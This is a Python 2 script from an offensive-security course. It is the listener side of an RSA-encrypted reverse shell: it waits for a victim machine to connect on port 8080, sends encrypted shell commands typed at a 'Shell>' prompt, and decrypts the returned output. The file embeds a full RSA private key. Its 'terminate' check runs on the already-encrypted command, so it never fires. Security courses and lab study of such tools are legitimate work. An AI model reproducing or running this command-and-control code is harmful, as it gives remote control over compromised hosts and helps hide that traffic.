# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"


import socket    
from Crypto.PublicKey import RSA

def encrypt(message):
    #Remember that here we define the target's public key
    publickey ='''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAms5mJkSBV9C4iPlyxugD
WyaryfJE/e4Z2AvgY9YsNWZasTPQ9gCVoGrfd3I9Efmd2wHJVnBxjL0aenjFV1fa
9hHINMOO0JRQo+2umyg+QMd+EdglA9MWaXUgNb8ADa+zKCT+0VbF92iAlAmAFii6
aY4jkVKSUBVGkmn94WNIYSVzHNSr5JcaPEthRpAAJE2lwjA4OIqpKUDnK/0rzlNl
QkSlBbN7ztEtfzjzI3dJo+i/VsOaS8LHfsk3nKX2GU95AM3LhpF2cMRgIJJCSU2s
B6Hq+TiZFh9bWyceRPjvzJh3LZ2FJUh99kJ28ykIph9XjGMgXZVFmPOFYM7zFKYN
TPgZbO5RCj1LJVJqGlXThJ8PA+7rWwquDgTPMkiH4wP59K2Dz122FYoBDZ8KgP6H
XzcG18q5o/KxONO0whnOSFJQm2XnnbtM8g2DM+x6sYTWf+v75bMAdfNuzBeFNIxA
3FGpzaad+Dv1VNtDW6za5w+tpUjTnUrHyYGsPMo3+hXknhvFL9cmAktlYR+l3qXx
xRK1/zgPexfBTpu7i1qUZilEq5pej/3s0mTtmP7l1MMFU4e7xiBPTzX9QYtvruI5
pDbgT8tFmwhi64wm0mkagNiGDnV1vlHQs6s2rP6lbpvnL7GDOhgwgj1OGV3c13n3
Va82hzcUKsKRb4XKLUvTSaECAwEAAQ==
-----END PUBLIC KEY-----'''

    encryptor = RSA.importKey(publickey)
    global encriptedData
    encriptedData=encryptor.encrypt(message, 0)
    return encriptedData[0]

def decrypt(cipher):
    #Remember that here we define our (the server's) private key
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    
    decryptor = RSA.importKey(privatekey)
    dec = decryptor.decrypt(cipher)   
    return dec




def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s.bind(("10.10.10.100", 8080))                           
    s.listen(1)                                             
                                                            
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()     
    print '[+] We got a connection from: ', addr

    while True:
        store = '' 
        command = raw_input("Shell> ")
        command = encrypt(command)
        
        if 'terminate' in command:       
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command)
            result = conn.recv(512)
            if len (  decrypt (result) ) ==512:
                store = store + decrypt (result)
                result = conn.recv(512)
                store = store + decrypt (result)
                #If the received output was bigger than 1024 Bytes, then we need to repeat the last two lines
                
            else:
                print decrypt (result)
                
        print store
            
           
def main ():
    connect()
main()











